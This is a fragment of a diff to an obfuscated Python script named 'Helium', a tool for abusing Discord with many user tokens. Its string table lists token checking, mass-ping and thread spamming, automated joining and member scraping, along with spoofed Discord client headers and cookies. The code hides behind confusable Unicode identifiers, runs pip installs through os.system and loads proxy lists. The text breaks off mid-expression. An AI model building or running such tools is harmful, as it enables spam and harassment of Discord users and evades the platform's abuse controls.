'no valid tokens in guild', 'a+', ' -  || <@!', '> |||| <@!', '> ||', 'Authorization', 'content-length', 'origin', 'sec-ch-ua', 'sec-ch-ua-mobile', 'sec-ch-ua-platform', 'sec-fetch-dest', 'sec-fetch-mode', 'sec-fetch-site', 'x-debug-options', 'x-discord-timezone', 'pl', '0', '__dcfduid=4e0a8d504a4411eeb88f7f88fbb5d20a; __sdcfduid=4e0a8d514a4411eeb88f7f88fbb5d20ac488cd4896dae6574aaa7fbfb35f5b22b405bbd931fdcb72c21f85b263f61400; __stripe_mid=95b0994a-5555-4ae2-a529-19de05e8a84261fc41; cf_clearance=ipf6ofbR8N9QZhQ1Oo0kyIrHeAY3IaG.fFDwKzznKCI-1694246626-0-1-a544f47e.ac16d7c4.fcbd86dd-0.2.1694246626; __cfruid=af646639dffe9110a3a9de9f0e1ebd2752a01153-1694278928; __stripe_sid=e54ed780-00b5-44d5-a066-1ea1092a1644ec258f', '"Not?A_Brand";v="8", "Chromium";v="108"', '?0', '"Windows"', 'empty', 'cors', 'same-origin', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9017 Chrome/108.0.5359.215 Electron/22.3.12 Safari/537.36', 'bugReporterEnabled', 'Europe/Warsaw', 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDE3Iiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InBsIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMTcgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMTIgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMTIiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyMjYyMjAsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM2NDQyLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==', 'https://canary.discordapp.com/api/v9/users/@me/library', 'http', 'https', 'http://', '.', 'Valid', '**', 'Locked', 'Invalid', 'wss://gateway.discord.gg/?v=9&encoding=json', 'token', 'properties', '$os', '$browser', '$device', 'windows', 'Discord', 'desktop', 'channel_id', 'self_mute', 'self_deaf', 'Joined', 'content', 'https://discord.com/api/v9/channels/', '/messages', 'Sent', 'Fail', '** ', 'online', 'idle', 'dnd', 'wss://gateway.discord.gg/?v=6&encording=json', 'capabilities', 'presence', 'compress', 'client_state', 'device', 'referrer', 'referring_domain', 'referrer_current', 'referring_domain_current', 'Chrome', 'en-GB', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36', '90.0.4430.212', '10', '85108', 'null', 'status', 'since', 'activities', 'afk', 'guild_hashes', 'highest_last_message_id', 'read_state_version', 'user_guild_settings_version', 'bio', 'https://discord.com/api/v9/users/@me/profile', 'Success', 'Failure', 'nick', '/members/@me', 'type', 'auto_archive_duration', 'location', 'Thread Browser Toolbar', '/threads', 'applied_tags', '/threads?use_nested_fields=true', '/member-verification?with_guild=false', '/requests/@me', 'Failed', '/', '/messages/', '/reactions/', '/@me?location=Message', 'Reacted', 'avatars/', 'rb+', 'avatar', 'data:image/png;base64,', 'utf-8', 'https://discord.com/api/v9/users/@me', 'limit', 'around', '50', 'components', 'nonce', 'message_flags', 'message_id', 'application_id', 'author', 'component_type', 'custom_id', 'https://discord.com/api/v9/interactions', '1', '2', '3', '4', '5', '6', '7', '8', '9', '11', '12', '13', '14', '15', '16', '20', '    ', '>', '\nPress any key to go back to the main menu...', 'pause > nul', 'title Helium - avatar changer', 'title Helium - formater', ':', '+', '] Formatted ', ' tokens', 'Message Link', '] → ', "If there's 1 button, type: (", '), if you want to click second button just type 1 or more.', 'Button Option', "If there's 1 reaction, type: (", '), if reaction is the second reaction just type 1 or more.', 'Reaction', 'title Helium - Forms Spammer', 'Channel ID', 'Thread Name', 'Message', 'title Helium - Thread spammer', 'Thread name', 'title Helium - Nickname Changer', 'Guild ID', 'Nick', 'title Helium - Check Guild', 'INVITE: ', 'Joining Delay', 'https://', 'title Helium - Accept rules', 'Server ID: ', 'title Helium - VC Joiner', 'title Helium - Bio Changer', 'Bio', 'GUILD ID', 'title Helium - Token Checker', 'title Helium - Onliner', 'Onliner', '] All tokens are online', 'title Helium - Spammer', 'Mass-Ping?', ' → ', '→ ', 'Delay', 'y', 'Pings Count', 'Scraping Members', '(it might take a while)', 'n', 'title Helium - exit', '__main__']
 import os
-𝗼𝘴.system(𝙉𝘔𝙈𝙈𝗡𝘭𝗹𝘔𝘔𝙡𝘔𝗠𝙉𝗹𝘐𝙈𝘐𝙄𝘕𝗠𝙄𝘐𝗠𝗜𝙡𝙄𝗡𝙄𝗠𝘐𝗜𝙈[0])
-𝗼𝘀.system(𝘕𝘔𝙈𝙈𝙉𝘭𝗹𝙈𝘔𝘭𝙈𝘔𝙉𝙡𝘐𝘔𝘐𝗜𝙉𝗠𝙄𝙄𝙈𝙄𝘭𝘐𝘕𝗜𝘔𝘐𝘐𝗠[1])
+𝘰𝘀.system(𝘐𝘕𝙄𝗡𝙡𝘭𝙄𝙈𝘐𝙄𝙡𝘔𝘭𝙡𝗜𝘭𝙡𝙉𝙉𝗜𝘭𝗹𝗠𝙉𝗹𝙉𝗹𝗠𝘐𝘔𝙄𝘔[0])
+𝙤𝘀.system(𝗜𝘕𝙄𝙉𝘭𝙡𝙄𝘔𝙄𝗜𝗹𝗠𝙡𝘭𝙄𝘭𝗹𝘕𝘕𝗜𝘭𝙡𝗠𝗡𝙡𝘕𝘭𝙈𝙄𝘔𝙄𝙈[1])
 try:
     from colorama import Fore
     from os.path import isfile, join
@@ -179,924 +191,954 @@ try:
     import uuid
     import websocket
     import emoji as ej
-except 𝙈𝗼𝗱𝘶𝙡𝘦𝙉𝘰𝘁𝙁𝘰𝘂𝗻𝗱𝗘𝘳𝘳𝗼𝘳:
-    𝘪 = 0
-    𝘪𝗺𝘱𝗼𝙧𝙩𝘴 = [𝙉𝘔𝘔𝙈𝙉𝙡𝗹𝘔𝙈𝙡𝘔𝙈𝘕𝘭𝙄𝘔𝗜𝗜𝗡𝗠𝙄𝙄𝗠𝘐𝗹𝘐𝘕𝗜𝗠𝗜𝘐𝙈[2], 𝙉𝙈𝘔𝗠𝗡𝘭𝗹𝗠𝗠𝘭𝘔𝗠𝘕𝙡𝗜𝙈𝙄𝙄𝘕𝗠𝘐𝙄𝗠𝙄𝘭𝙄𝘕𝘐𝘔𝙄𝗜𝗠[3], 𝙉𝘔𝙈𝗠𝘕𝗹𝗹𝘔𝗠𝗹𝘔𝘔𝗡𝙡𝗜𝗠𝗜𝗜𝗡𝗠𝗜𝗜𝗠𝘐𝗹𝗜𝘕𝙄𝗠𝙄𝗜𝙈[4], 𝙉𝘔𝙈𝗠𝘕𝗹𝘭𝗠𝗠𝘭𝘔𝗠𝘕𝘭𝙄𝙈𝗜𝘐𝘕𝙈𝙄𝙄𝗠𝘐𝗹𝗜𝙉𝗜𝙈𝗜𝗜𝗠[5], 𝘕𝙈𝙈𝗠𝗡𝘭𝙡𝗠𝗠𝗹𝙈𝗠𝘕𝘭𝗜𝗠𝙄𝘐𝙉𝙈𝙄𝙄𝗠𝙄𝘭𝙄𝗡𝙄𝙈𝙄𝘐𝗠[6], 𝗡𝗠𝘔𝙈𝙉𝘭𝙡𝙈𝗠𝗹𝗠𝙈𝙉𝙡𝙄𝙈𝗜𝙄𝘕𝘔𝘐𝙄𝗠𝙄𝘭𝗜𝗡𝗜𝗠𝙄𝗜𝗠[7], 𝙉𝙈𝘔𝘔𝗡𝙡𝘭𝘔𝙈𝘭𝘔𝗠𝙉𝘭𝗜𝗠𝘐𝙄𝘕𝗠𝘐𝘐𝘔𝙄𝘭𝙄𝘕𝘐𝙈𝘐𝘐𝙈[8], 𝘕𝗠𝗠𝗠𝘕𝘭𝗹𝙈𝙈𝙡𝘔𝗠𝘕𝗹𝘐𝗠𝙄𝘐𝙉𝗠𝘐𝗜𝙈𝘐𝘭𝗜𝘕𝗜𝙈𝙄𝘐𝗠[9], 𝗡𝘔𝙈𝙈𝗡𝘭𝙡𝘔𝗠𝙡𝙈𝘔𝗡𝙡𝗜𝗠𝘐𝙄𝙉𝘔𝙄𝘐𝗠𝗜𝘭𝙄𝗡𝗜𝗠𝙄𝘐𝘔[10], 𝙉𝘔𝗠𝙈𝙉𝘭𝗹𝙈𝗠𝗹𝙈𝗠𝙉𝘭𝘐𝗠𝙄𝗜𝗡𝗠𝘐𝘐𝗠𝗜𝙡𝗜𝙉𝘐𝘔𝙄𝙄𝗠[3], 𝙉𝗠𝙈𝗠𝗡𝗹𝗹𝗠𝗠𝙡𝙈𝘔𝘕𝙡𝘐𝙈𝗜𝘐𝗡𝘔𝘐𝘐𝙈𝗜𝘭𝘐𝗡𝙄𝙈𝘐𝙄𝙈[11], 𝘕𝙈𝗠𝘔𝙉𝙡𝗹𝘔𝘔𝘭𝘔𝙈𝘕𝘭𝗜𝘔𝗜𝙄𝗡𝗠𝙄𝙄𝘔𝙄𝙡𝙄𝙉𝙄𝘔𝘐𝘐𝗠[12], 𝙉𝙈𝙈𝗠𝙉𝘭𝘭𝘔𝙈𝗹𝘔𝘔𝗡𝙡𝗜𝗠𝙄𝙄𝗡𝙈𝗜𝗜𝗠𝙄𝗹𝘐𝙉𝗜𝘔𝗜𝙄𝙈[13], 𝘕𝙈𝗠𝘔𝗡𝗹𝘭𝘔𝙈𝙡𝗠𝙈𝘕𝙡𝘐𝘔𝘐𝗜𝗡𝙈𝘐𝙄𝙈𝗜𝗹𝗜𝘕𝙄𝙈𝘐𝙄𝘔[14], 𝗡𝙈𝗠𝘔𝙉𝗹𝘭𝗠𝙈𝙡𝙈𝗠𝘕𝘭𝙄𝗠𝙄𝘐𝗡𝘔𝘐𝙄𝙈𝗜𝗹𝙄𝙉𝘐𝗠𝘐𝙄𝗠[15], 𝘕𝘔𝗠𝙈𝗡𝙡𝙡𝘔𝗠𝙡𝙈𝙈𝙉𝘭𝙄𝘔𝙄𝙄𝘕𝙈𝘐𝗜𝙈𝘐𝗹𝘐𝗡𝘐𝗠𝘐𝗜𝙈[16], 𝘕𝙈𝗠𝘔𝙉𝗹𝗹𝘔𝙈𝙡𝗠𝗠𝙉𝙡𝙄𝙈𝘐𝗜𝗡𝘔𝗜𝗜𝗠𝗜𝙡𝘐𝘕𝙄𝗠𝘐𝙄𝙈[17], 𝙉𝙈𝗠𝗠𝗡𝗹𝙡𝙈𝗠𝗹𝙈𝗠𝙉𝘭𝘐𝗠𝙄𝗜𝙉𝙈𝘐𝙄𝗠𝗜𝗹𝗜𝙉𝙄𝗠𝘐𝘐𝗠[18]]
-    for 𝘦𝘇1 in 𝗶𝙢𝙥𝘰𝙧𝙩𝘴:
-        𝘪 += 1
-        𝘰𝘴.system(𝗡𝗠𝙈𝗠𝗡𝗹𝘭𝘔𝘔𝘭𝘔𝘔𝘕𝙡𝗜𝗠𝙄𝙄𝘕𝘔𝘐𝙄𝗠𝘐𝘭𝗜𝗡𝙄𝗠𝙄𝗜𝗠[1])
-        𝗼𝘀.system(𝗡𝘔𝗠𝘔𝙉𝗹𝗹𝗠𝙈𝗹𝙈𝗠𝗡𝗹𝙄𝗠𝘐𝗜𝙉𝙈𝘐𝗜𝙈𝙄𝙡𝘐𝘕𝘐𝘔𝗜𝙄𝗠[19])
-        𝘱𝗿𝗶𝙣𝘵(f'{𝙉𝙈𝘔𝗠𝙉𝘭𝘭𝗠𝙈𝗹𝘔𝙈𝗡𝗹𝘐𝘔𝗜𝘐𝗡𝘔𝗜𝙄𝘔𝙄𝙡𝗜𝗡𝙄𝙈𝘐𝗜𝘔[20]}{𝘪}{𝘕𝙈𝗠𝙈𝘕𝙡𝙡𝗠𝘔𝙡𝗠𝙈𝗡𝗹𝗜𝘔𝗜𝘐𝗡𝘔𝘐𝘐𝘔𝙄𝗹𝘐𝗡𝗜𝘔𝙄𝗜𝘔[21]}')
-        𝘰𝘀.system(f'{𝗡𝘔𝙈𝗠𝙉𝗹𝙡𝙈𝗠𝗹𝙈𝗠𝗡𝙡𝙄𝗠𝘐𝘐𝗡𝙈𝗜𝘐𝙈𝘐𝙡𝙄𝙉𝗜𝙈𝗜𝗜𝗠[22]}{𝘦𝘻1}{𝘕𝘔𝘔𝙈𝗡𝙡𝙡𝗠𝙈𝘭𝙈𝗠𝗡𝙡𝘐𝙈𝙄𝗜𝘕𝗠𝘐𝗜𝙈𝗜𝘭𝘐𝘕𝙄𝗠𝘐𝙄𝙈[23]}')
-    𝗽𝗿𝗶𝘯𝙩(𝙉𝘔𝙈𝘔𝙉𝙡𝘭𝙈𝘔𝗹𝙈𝘔𝙉𝙡𝗜𝙈𝘐𝘐𝘕𝘔𝙄𝘐𝙈𝙄𝘭𝙄𝗡𝘐𝘔𝘐𝙄𝘔[24])
-𝘤𝙤𝙡𝙤𝗿𝙖𝙢𝙖.init()
-𝘀𝗱𝗶𝗿 = 𝙤𝘀.path.dirname(𝗼𝘴.path.abspath(__𝗳𝘪𝘭𝗲__))
-𝗱𝘢𝘁𝙖 = 𝘰𝙨.path.join(𝘴𝘥𝘪𝙧, 𝘕𝗠𝗠𝗠𝙉𝘭𝘭𝗠𝗠𝗹𝗠𝗠𝗡𝗹𝙄𝙈𝙄𝘐𝘕𝙈𝗜𝘐𝗠𝗜𝗹𝗜𝗡𝗜𝙈𝙄𝙄𝘔[25])
-𝘢𝙗𝗰 = 𝙤𝘴.path.dirname(𝘰𝘀.path.abspath(𝘥𝗮𝘁𝙖))
-𝘢𝙫𝗮𝙩𝙖𝗿𝘴 = 𝘰𝙨.path.join(𝘢𝗯𝙘, 𝘕𝗠𝘔𝗠𝙉𝙡𝙡𝗠𝗠𝘭𝗠𝙈𝙉𝗹𝗜𝗠𝗜𝙄𝙉𝗠𝘐𝘐𝗠𝙄𝗹𝙄𝗡𝗜𝘔𝙄𝗜𝙈[26])
-if not 𝗼𝘴.path.exists(𝘥𝙖𝙩𝙖):
-    𝙤𝘀.system(𝗡𝙈𝘔𝘔𝗡𝙡𝘭𝗠𝗠𝗹𝙈𝘔𝘕𝙡𝗜𝗠𝗜𝙄𝙉𝘔𝙄𝘐𝗠𝙄𝘭𝘐𝗡𝙄𝘔𝙄𝘐𝗠[19])
-    𝘰𝘴.makedirs(𝙙𝘢𝘁𝗮)
-    𝘰𝘴.makedirs(𝗮𝙫𝙖𝙩𝙖𝙧𝘴)
-    with 𝗼𝗽𝘦𝘯(𝙤𝘀.path.join(𝗱𝗮𝘵𝘢, 𝗡𝙈𝘔𝘔𝗡𝙡𝗹𝗠𝘔𝙡𝘔𝘔𝗡𝙡𝘐𝗠𝗜𝗜𝙉𝙈𝘐𝙄𝙈𝙄𝘭𝙄𝘕𝘐𝗠𝘐𝗜𝗠[27]), 𝙉𝘔𝗠𝗠𝗡𝙡𝗹𝗠𝙈𝙡𝙈𝗠𝙉𝘭𝘐𝗠𝙄𝘐𝙉𝙈𝘐𝘐𝙈𝗜𝙡𝙄𝘕𝗜𝗠𝗜𝗜𝘔[28]) as 𝗳:
-        𝘧.write(𝗡𝘔𝗠𝗠𝙉𝘭𝗹𝗠𝙈𝙡𝗠𝙈𝘕𝙡𝘐𝘔𝘐𝗜𝘕𝙈𝘐𝙄𝘔𝙄𝗹𝗜𝘕𝗜𝘔𝘐𝘐𝘔[29])
-    with 𝘰𝗽𝘦𝗻(𝙤𝘴.path.join(𝗱𝗮𝘁𝗮, 𝘕𝘔𝘔𝘔𝗡𝗹𝘭𝘔𝘔𝙡𝙈𝙈𝗡𝘭𝗜𝘔𝘐𝗜𝗡𝙈𝙄𝙄𝘔𝙄𝘭𝙄𝘕𝗜𝙈𝘐𝙄𝘔[30]), 𝙉𝗠𝗠𝙈𝘕𝘭𝙡𝗠𝗠𝘭𝙈𝙈𝗡𝙡𝙄𝘔𝗜𝘐𝗡𝙈𝙄𝘐𝙈𝘐𝘭𝙄𝙉𝗜𝘔𝙄𝗜𝙈[28]) as 𝗳:
-        𝙛.write(𝗡𝘔𝘔𝗠𝘕𝘭𝘭𝙈𝘔𝗹𝗠𝗠𝗡𝙡𝘐𝙈𝘐𝘐𝘕𝗠𝘐𝗜𝙈𝙄𝘭𝘐𝘕𝗜𝙈𝗜𝙄𝙈[29])
-    with 𝙤𝗽𝗲𝙣(𝘰𝙨.path.join(𝘥𝙖𝙩𝙖, 𝙉𝘔𝗠𝗠𝘕𝙡𝙡𝗠𝙈𝙡𝗠𝙈𝘕𝘭𝗜𝗠𝗜𝗜𝗡𝘔𝗜𝙄𝘔𝗜𝙡𝗜𝙉𝘐𝘔𝘐𝘐𝙈[31]), 𝙉𝘔𝙈𝙈𝙉𝗹𝘭𝙈𝙈𝙡𝘔𝗠𝗡𝘭𝙄𝘔𝙄𝘐𝗡𝙈𝗜𝙄𝗠𝗜𝗹𝙄𝘕𝗜𝘔𝘐𝘐𝗠[28]) as 𝗳:
-        𝙛.write(𝙉𝙈𝘔𝘔𝙉𝘭𝗹𝙈𝙈𝘭𝙈𝘔𝗡𝙡𝙄𝘔𝗜𝗜𝗡𝘔𝘐𝗜𝘔𝗜𝘭𝙄𝙉𝙄𝙈𝗜𝘐𝘔[29])
-𝘤𝙤𝗻𝗳𝙞𝙜𝘱 = 𝙤𝘴.path.join(𝘀𝗱𝗶𝘳, 𝙉𝘔𝗠𝙈𝗡𝘭𝘭𝗠𝗠𝙡𝘔𝙈𝗡𝗹𝘐𝗠𝘐𝗜𝘕𝘔𝗜𝗜𝗠𝘐𝘭𝙄𝘕𝘐𝗠𝙄𝘐𝗠[32])
-if not 𝗼𝙨.path.exists(𝘤𝙤𝗻𝘧𝙞𝙜𝘱):
-    with 𝘰𝙥𝗲𝗻(𝗼𝘀.path.join(𝗡𝙈𝙈𝗠𝙉𝘭𝘭𝘔𝘔𝙡𝘔𝗠𝙉𝗹𝙄𝗠𝙄𝘐𝙉𝙈𝘐𝙄𝗠𝙄𝘭𝙄𝘕𝙄𝘔𝗜𝙄𝘔[32]), 𝙉𝗠𝙈𝘔𝗡𝘭𝗹𝘔𝘔𝙡𝙈𝙈𝙉𝙡𝗜𝘔𝙄𝘐𝙉𝘔𝗜𝙄𝘔𝗜𝘭𝗜𝙉𝗜𝘔𝘐𝘐𝙈[28]) as 𝙛:
-        𝙛.write(𝘕𝗠𝗠𝘔𝘕𝗹𝙡𝗠𝘔𝗹𝘔𝘔𝘕𝘭𝗜𝙈𝗜𝙄𝘕𝙈𝘐𝗜𝗠𝙄𝗹𝘐𝗡𝗜𝘔𝙄𝙄𝘔[33])
-with 𝗼𝗽𝗲𝘯(𝘕𝘔𝘔𝘔𝗡𝗹𝘭𝙈𝙈𝙡𝙈𝘔𝙉𝙡𝗜𝗠𝗜𝗜𝘕𝗠𝗜𝘐𝘔𝙄𝘭𝗜𝗡𝘐𝗠𝙄𝙄𝙈[32], encoding=𝙉𝙈𝗠𝘔𝘕𝗹𝘭𝗠𝗠𝗹𝙈𝘔𝘕𝘭𝙄𝗠𝘐𝘐𝘕𝗠𝙄𝗜𝙈𝙄𝘭𝘐𝗡𝘐𝗠𝙄𝘐𝗠[34]) as 𝘧:
-    𝗻𝙞𝙜 = 𝗷𝘴𝘰𝙣.load(𝘧)
-𝗽𝗿𝗼𝘅𝘺 = 𝘯𝙞𝗴.get(𝘕𝙈𝙈𝙈𝘕𝙡𝙡𝙈𝗠𝙡𝗠𝙈𝗡𝗹𝗜𝗠𝘐𝙄𝘕𝗠𝙄𝘐𝘔𝙄𝗹𝙄𝘕𝗜𝗠𝘐𝗜𝙈[35])
-𝙥𝙧𝙤𝘹𝗶𝘦𝘴 = 𝗼𝗽𝗲𝗻(𝗡𝙈𝗠𝘔𝘕𝘭𝗹𝘔𝙈𝗹𝙈𝙈𝙉𝘭𝘐𝙈𝙄𝘐𝗡𝙈𝙄𝗜𝗠𝙄𝙡𝗜𝘕𝗜𝙈𝗜𝘐𝘔[36], 𝗡𝗠𝘔𝙈𝗡𝘭𝘭𝘔𝘔𝘭𝙈𝙈𝗡𝘭𝙄𝙈𝗜𝙄𝗡𝘔𝙄𝙄𝗠𝘐𝙡𝙄𝙉𝙄𝗠𝗜𝘐𝙈[37], encoding=𝙉𝗠𝘔𝙈𝙉𝗹𝗹𝘔𝗠𝙡𝙈𝙈𝗡𝗹𝙄𝙈𝙄𝙄𝗡𝗠𝗜𝘐𝘔𝙄𝙡𝗜𝘕𝗜𝙈𝘐𝘐𝗠[34]).read().splitlines()
-𝘣 = 𝙁𝗼𝗿𝙚.LIGHTBLUE_EX
-𝙧 = 𝙁𝙤𝗿𝙚.RESET
-𝘨 = 𝗙𝘰𝘳𝘦.LIGHTBLACK_EX
-𝙖 = 𝙁𝙤𝘳𝘦.BLUE
-𝙘 = 𝙁𝙤𝙧𝙚.CYAN
-𝙡𝗰 = 𝘍𝙤𝘳𝙚.LIGHTCYAN_EX
-𝗿𝘦𝙙 = 𝗙𝗼𝙧𝘦.RED
-𝙮𝗲𝗹𝙡𝗼𝘄 = 𝙁𝘰𝗿𝘦.YELLOW
-𝙜𝙧𝙚𝗲𝗻 = 𝘍𝙤𝙧𝘦.GREEN
-𝗯𝙡𝘶𝙚 = 𝗙𝘰𝗿𝘦.BLUE
-𝗼𝗿𝘢𝗻𝘨𝙚 = 𝙁𝘰𝘳𝙚.RED + 𝗙𝙤𝘳𝗲.YELLOW
-𝙥𝙧𝙚𝘵𝙩𝙮 = 𝗙𝘰𝘳𝘦.LIGHTMAGENTA_EX + 𝘍𝙤𝘳𝙚.LIGHTCYAN_EX
-𝗺𝗮𝙜𝘦𝗻𝘵𝘢 = 𝘍𝗼𝘳𝗲.MAGENTA
-𝗹𝘪𝙜𝘩𝘁𝘣𝙡𝘶𝙚 = 𝗙𝗼𝘳𝙚.LIGHTBLUE_EX
-𝙘𝘆𝗮𝗻 = 𝙁𝙤𝙧𝙚.CYAN
-𝙜𝗿𝙖𝘆 = 𝘍𝙤𝙧𝗲.LIGHTBLACK_EX + 𝘍𝗼𝗿𝙚.WHITE
-𝗿𝘦𝙨𝙚𝘁 = 𝘍𝗼𝙧𝘦.RESET
-𝘱𝘪𝙣𝗸 = 𝗙𝘰𝘳𝗲.LIGHTGREEN_EX + 𝗙𝙤𝙧𝘦.LIGHTMAGENTA_EX
-𝘴𝗲𝘀𝘀𝙞𝗼𝗻 = 𝙩𝗹𝙨_𝙘𝙡𝘪𝘦𝗻𝘵.Session(𝗡𝙈𝘔𝗠𝗡𝘭𝗹𝗠𝘔𝘭𝗠𝘔𝘕𝘭𝙄𝙈𝙄𝙄𝘕𝙈𝙄𝙄𝘔𝙄𝙡𝙄𝘕𝗜𝘔𝗜𝘐𝙈[38])
-𝗺𝘦𝘯𝘂 = f'{𝘳}{𝙉𝙈𝗠𝘔𝗡𝙡𝘭𝘔𝘔𝙡𝙈𝙈𝘕𝙡𝙄𝘔𝗜𝙄𝙉𝙈𝗜𝙄𝙈𝘐𝙡𝗜𝗡𝗜𝗠𝘐𝙄𝙈[39]}{𝗹𝙘}{𝙉𝙈𝙈𝙈𝘕𝘭𝘭𝘔𝗠𝘭𝗠𝙈𝘕𝘭𝘐𝗠𝙄𝙄𝘕𝘔𝙄𝙄𝙈𝘐𝗹𝘐𝗡𝗜𝙈𝙄𝗜𝘔[40]}{𝙧}{𝗡𝘔𝘔𝙈𝙉𝘭𝙡𝗠𝙈𝗹𝗠𝗠𝗡𝗹𝘐𝗠𝘐𝙄𝙉𝗠𝙄𝘐𝗠𝗜𝙡𝘐𝙉𝗜𝗠𝙄𝘐𝘔[41]}{𝙡𝗰}{𝘕𝗠𝗠𝙈𝙉𝗹𝘭𝗠𝗠𝘭𝗠𝙈𝗡𝗹𝗜𝙈𝘐𝘐𝘕𝙈𝗜𝗜𝗠𝗜𝘭𝗜𝙉𝙄𝙈𝙄𝗜𝗠[42]}{𝗿}{𝗡𝙈𝗠𝘔𝙉𝘭𝙡𝘔𝙈𝘭𝗠𝘔𝙉𝘭𝙄𝗠𝙄𝘐𝙉𝗠𝙄𝘐𝘔𝘐𝘭𝘐𝙉𝙄𝙈𝗜𝘐𝗠[43]}{𝙡𝘤}{𝙉𝗠𝗠𝘔𝘕𝙡𝘭𝗠𝘔𝙡𝙈𝙈𝗡𝘭𝗜𝗠𝘐𝙄𝗡𝗠𝘐𝘐𝙈𝘐𝗹𝗜𝙉𝘐𝗠𝗜𝘐𝙈[42]}{𝙧}{𝙉𝘔𝘔𝘔𝙉𝘭𝗹𝗠𝙈𝘭𝘔𝗠𝗡𝙡𝗜𝙈𝗜𝙄𝘕𝙈𝗜𝘐𝗠𝗜𝙡𝗜𝘕𝙄𝘔𝙄𝙄𝘔[41]}{𝗹𝙘}{𝘕𝘔𝙈𝗠𝗡𝗹𝙡𝙈𝘔𝗹𝙈𝗠𝙉𝘭𝙄𝘔𝙄𝗜𝘕𝗠𝗜𝘐𝙈𝙄𝗹𝙄𝙉𝗜𝗠𝙄𝘐𝙈[44]}{𝘳}{𝘕𝗠𝗠𝙈𝙉𝗹𝙡𝘔𝙈𝘭𝘔𝙈𝗡𝗹𝗜𝙈𝘐𝘐𝗡𝗠𝘐𝘐𝙈𝗜𝗹𝙄𝙉𝙄𝙈𝗜𝙄𝗠[41]}{𝙡𝙘}{𝘕𝙈𝘔𝙈𝙉𝙡𝙡𝗠𝗠𝙡𝘔𝙈𝗡𝘭𝗜𝙈𝙄𝙄𝗡𝗠𝙄𝗜𝘔𝗜𝙡𝙄𝗡𝗜𝙈𝗜𝙄𝙈[42]}{𝘳}{𝙉𝗠𝘔𝗠𝗡𝘭𝗹𝘔𝙈𝗹𝘔𝙈𝘕𝗹𝗜𝙈𝘐𝗜𝗡𝘔𝗜𝙄𝙈𝘐𝗹𝘐𝘕𝗜𝙈𝙄𝘐𝘔[41]}{𝗹𝙘}{𝙉𝙈𝘔𝙈𝙉𝙡𝙡𝗠𝗠𝙡𝗠𝙈𝙉𝗹𝙄𝙈𝙄𝗜𝘕𝗠𝘐𝘐𝙈𝘐𝘭𝗜𝘕𝗜𝙈𝙄𝙄𝘔[45]}{𝗿}{𝘕𝘔𝙈𝗠𝙉𝙡𝙡𝗠𝘔𝘭𝘔𝗠𝘕𝗹𝘐𝗠𝘐𝙄𝗡𝙈𝙄𝗜𝗠𝗜𝙡𝘐𝗡𝙄𝘔𝘐𝗜𝘔[41]}{𝗹𝗰}{𝙉𝘔𝗠𝗠𝘕𝘭𝙡𝘔𝗠𝗹𝘔𝗠𝘕𝙡𝘐𝗠𝗜𝙄𝙉𝗠𝘐𝙄𝗠𝘐𝗹𝘐𝘕𝙄𝘔𝗜𝙄𝘔[42]}{𝘳}{𝙉𝗠𝗠𝘔𝗡𝘭𝗹𝙈𝘔𝙡𝙈𝘔𝗡𝘭𝗜𝗠𝗜𝘐𝙉𝗠𝙄𝗜𝗠𝗜𝗹𝗜𝘕𝙄𝙈𝗜𝗜𝘔[46]}{𝙡𝘤}{𝘕𝗠𝗠𝙈𝙉𝙡𝗹𝘔𝗠𝙡𝗠𝘔𝙉𝙡𝗜𝘔𝗜𝗜𝙉𝙈𝙄𝗜𝗠𝙄𝗹𝙄𝗡𝙄𝘔𝗜𝗜𝗠[45]}{𝗿}{𝙉𝗠𝘔𝗠𝘕𝙡𝗹𝗠𝗠𝙡𝙈𝘔𝗡𝙡𝗜𝗠𝗜𝙄𝙉𝙈𝘐𝙄𝙈𝙄𝗹𝗜𝗡𝙄𝗠𝘐𝗜𝙈[46]}{𝗹𝙘}{𝘕𝙈𝙈𝗠𝗡𝙡𝙡𝙈𝗠𝘭𝙈𝘔𝗡𝘭𝗜𝙈𝗜𝗜𝗡𝗠𝗜𝙄𝗠𝗜𝙡𝘐𝙉𝘐𝘔𝙄𝙄𝗠[47]}{𝙧}{𝗡𝘔𝙈𝙈𝙉𝙡𝙡𝙈𝗠𝗹𝗠𝗠𝘕𝘭𝗜𝗠𝙄𝙄𝘕𝙈𝙄𝙄𝗠𝗜𝙡𝗜𝘕𝙄𝘔𝙄𝘐𝙈[41]}{𝙡𝘤}{𝗡𝙈𝘔𝘔𝗡𝗹𝙡𝙈𝗠𝗹𝘔𝗠𝗡𝙡𝘐𝙈𝙄𝗜𝙉𝗠𝗜𝙄𝗠𝘐𝘭𝙄𝙉𝗜𝗠𝗜𝘐𝗠[48]}{𝗿}{𝘕𝗠𝗠𝘔𝘕𝗹𝗹𝘔𝗠𝗹𝗠𝗠𝘕𝘭𝗜𝙈𝗜𝘐𝗡𝙈𝗜𝘐𝗠𝗜𝙡𝙄𝗡𝘐𝘔𝙄𝙄𝗠[41]}{𝘭𝗰}{𝙉𝗠𝙈𝙈𝘕𝗹𝙡𝙈𝘔𝙡𝙈𝙈𝘕𝗹𝗜𝗠𝙄𝙄𝙉𝙈𝙄𝘐𝗠𝗜𝗹𝙄𝗡𝗜𝗠𝙄𝗜𝙈[49]}{𝗿}{𝗡𝙈𝘔𝘔𝗡𝗹𝙡𝗠𝗠𝙡𝙈𝙈𝗡𝙡𝘐𝗠𝗜𝘐𝗡𝘔𝘐𝘐𝘔𝘐𝘭𝘐𝗡𝗜𝗠𝙄